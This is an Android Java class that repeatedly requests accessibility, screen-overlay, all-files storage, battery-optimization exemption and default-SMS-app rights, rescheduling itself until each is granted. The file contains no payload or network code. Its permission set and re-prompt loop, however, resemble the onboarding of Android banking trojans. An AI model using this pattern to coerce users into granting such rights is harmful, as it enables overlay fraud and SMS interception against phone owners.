package com.enginepermissions.library.Flow;

import android.app.Activity;
import com.enginepermissions.library.Checker.Checker;
import com.enginepermissions.library.Requester.Requester;
import com.enginepermissions.library.Stage;
import java.util.function.Consumer;

public class StageProcessor {
    private static final long DELAY = FlowScheduler.getDelay();

    private final Activity activity;
    private final Checker checker;
    private final Requester requester;
    private Consumer<Stage> stageCallbackHandler;
    private java.util.function.Consumer<Long> scheduleCallback;

    public StageProcessor(Activity activity, Checker checker, Requester requester) {
        this.activity = activity;
        this.checker = checker;
        this.requester = requester;
    }

    public void setStageCallbackHandler(Consumer<Stage> callbackHandler) {
        this.stageCallbackHandler = callbackHandler;
    }

    public void setScheduleCallback(java.util.function.Consumer<Long> callback) {
        this.scheduleCallback = callback;
    }

    public boolean processStage(Stage stage) {
        switch (stage) {
            case ACCESSIBILITY:
                return processAccessibility();
            case OVERLAY:
                return processOverlay();
            case MANAGE_STORAGE:
                return processManageStorage();
            case BATTERY_OPTIMIZATIONS:
                return processBatteryOptimizations();
            case CHANGE_SMS_MANAGER:
                return processSmsManager();
            default:
                return true;
        }
    }

    private boolean processAccessibility() {
        boolean accGranted = checker.checkAccessibility();
        if (accGranted) {
            return true;
        }
        boolean accRequested = requester.requestAccessibility();
        if (accRequested) {
            triggerCallback(Stage.ACCESSIBILITY);
            schedule(0);
        } else {
            schedule(0);
        }
        return false;
    }

    private boolean processOverlay() {
        boolean overlayGranted = checker.checkOverlay();
        if (overlayGranted) {
            return true;
        }
        boolean overlayRequested = requester.requestOverlay();
        if (overlayRequested) {
            triggerCallback(Stage.OVERLAY);
            schedule(0);
        } else {
            schedule(0);
        }
        return false;
    }

    private boolean processManageStorage() {
        boolean storageNeeded = checker.needManageStorage();
        if (!storageNeeded) {
            return true;
        }
        boolean storageRequested = requester.requestManageStorage();
        if (storageRequested) {
            triggerCallback(Stage.MANAGE_STORAGE);
            schedule(0);
        } else {
            schedule(0);
        }
        return false;
    }

    private boolean processBatteryOptimizations() {
        boolean batteryGranted = checker.checkBatteryOptimizations();
        if (batteryGranted) {
            return true;
        }
        boolean batteryRequested = requester.requestBatteryOptimizations();
        if (batteryRequested) {
            triggerCallback(Stage.BATTERY_OPTIMIZATIONS);
            schedule(0);
        } else {
            schedule(0);
        }
        return false;
    }

    private boolean processSmsManager() {
        boolean smsGranted = checker.checkSMSManagerChange();
        if (smsGranted) {
            return true;
        }
        requester.requestSMS();
        triggerCallback(Stage.CHANGE_SMS_MANAGER);
        schedule(0);
        return false;
    }

    private void triggerCallback(Stage stage) {
        if (stageCallbackHandler != null) {
            stageCallbackHandler.accept(stage);
        }
    }

    private void schedule(long delay) {
        if (scheduleCallback != null) {
            scheduleCallback.accept(delay);
        }
    }
}

